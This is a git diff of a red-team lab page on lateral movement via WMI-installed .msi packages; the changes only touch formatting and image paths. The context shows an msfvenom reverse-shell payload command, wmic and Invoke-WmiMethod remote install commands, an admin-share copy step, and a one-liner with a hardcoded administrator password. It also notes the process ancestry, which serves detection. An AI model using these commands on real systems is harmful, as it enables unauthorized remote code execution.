@@ -6,7 +6,7 @@ description: WMI lateral movement with .msi packages
 
 ## Execution
 
-Generating malicious payload in MSI \(Microsoft Installer Package\):
+Generating malicious payload in MSI (Microsoft Installer Package):
 
 {% code title="attacker@local" %}
 ```csharp
@@ -14,7 +14,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f msi > evil
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2018-10-19-17-31-00.png)
+![](<../../.gitbook/assets/Screenshot from 2018-10-19 17-31-00.png>)
 
 I tried executing the .msi payload like so, but got a return code `1619` and a quick search on google returned nothing useful:
 
@@ -24,7 +24,7 @@ wmic /node:10.0.0.7 /user:offense\administrator product call install PackageLoca
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2018-10-19-18-45-55.png)
+![](<../../.gitbook/assets/Screenshot from 2018-10-19 18-45-55.png>)
 
 I had to revert to a filthy way of achieving the goal:
 
@@ -34,7 +34,7 @@ net use \\10.0.0.7\c$ /user:administrator@offense; copy C:\experiments\evil64.ms
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/peek-2018-10-19-18-41.gif)
+![](<../../.gitbook/assets/Peek 2018-10-19 18-41.gif>)
 
 Additionally, the same could of be achieved using powershell cmdlets:
 
@@ -46,11 +46,11 @@ Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\
 
 Get a prompt for credentials:
 
-![](../../.gitbook/assets/screenshot-from-2018-10-19-19-02-10.png)
+![](<../../.gitbook/assets/Screenshot from 2018-10-19 19-02-10.png>)
 
 and enjoy the code execution:
 
-![](../../.gitbook/assets/screenshot-from-2018-10-19-19-02-48.png)
+![](<../../.gitbook/assets/Screenshot from 2018-10-19 19-02-48.png>)
 
 Or if no GUI is available for credentials, a oneliner:
 
@@ -60,21 +60,20 @@ $username = 'Administrator';$password = '123456';$securePassword = ConvertTo-Sec
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2018-10-19-19-09-42.png)
+![](<../../.gitbook/assets/Screenshot from 2018-10-19 19-09-42.png>)
 
 ## Observations
 
 Note the process ancestry: `services > msiexec.exe > .tmp > cmd.exe`:
 
-![](../../.gitbook/assets/screenshot-from-2018-10-19-18-46-37.png)
+![](<../../.gitbook/assets/Screenshot from 2018-10-19 18-46-37.png>)
 
-and that the connection is initiated by the .tmp file \(I ran another test, hence another file name\):
+and that the connection is initiated by the .tmp file (I ran another test, hence another file name):
 
-![](../../.gitbook/assets/screenshot-from-2018-10-19-18-55-53.png)
+![](<../../.gitbook/assets/Screenshot from 2018-10-19 18-55-53.png>)
 
 ## References
 
 {% embed url="https://www.cybereason.com/blog/wmi-lateral-movement-win32" %}
 
 {% embed url="https://twitter.com/buffaloverflow/status/1002523407261536256" %}
-
